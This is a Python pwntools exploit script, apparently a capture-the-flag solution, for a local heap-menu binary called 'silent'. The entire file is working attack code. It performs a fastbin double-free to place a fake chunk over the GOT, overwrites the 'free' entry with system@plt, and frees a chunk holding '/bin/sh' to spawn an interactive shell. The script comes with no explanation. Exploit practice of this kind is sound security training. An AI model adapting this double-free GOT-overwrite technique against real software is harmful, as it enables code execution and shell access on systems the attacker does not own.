from pwn import *

#context.log_level = 'debug'

r = process('./silent')
elf = ELF('./silent')

# copied from elf.py: def bss(self, offset=0)
def getSection(name):
  orig_bss = elf.get_section_by_name(name).header.sh_addr
  curr_bss = orig_bss - elf.load_addr + elf.address
  return curr_bss

system_plt = elf.plt['system']
print 'system_plt= ' + hex(system_plt)
free_got = elf.got['free']
print 'free_got= ' + hex(free_got)
got0= elf.get_section_by_name('.got.plt').header.sh_addr
print 'got0= ' + hex(got0)
fake_chunk = got0 + 2 - 8
print 'fake_chunk= ' + hex(fake_chunk)

def add(size, content):
  r.sendline('1')
  r.sendline(str(size))
  r.send(content)

def free(index):
  r.sendline('2')
  r.sendline(str(index))

def edit(index, content, unk_602120):
  r.sendline('3')
  r.sendline(str(index))
  r.sendline(content)
  r.sendline(unk_602120)

def exp():
  r.recvuntil('\n\n')
  add(0x50, 'a')  # 0
  add(0x50, 'b')  # 1
  free(0)
  free(1)
  free(0)

  add(0x50, p64(fake_chunk))  # 2

  add(0x50, 'b')  # 3
  add(0x50, 'b')  # 4
#  gdb.attach(r)
  pay = '/bin/sh' # could be $0 or sh
  pay = pay.ljust(free_got - (fake_chunk + 0x10),'\0') + p64(system_plt)
  add(0x50, pay)  # 5

  free(5)
  r.interactive()


if __name__ == '__main__':
  exp()
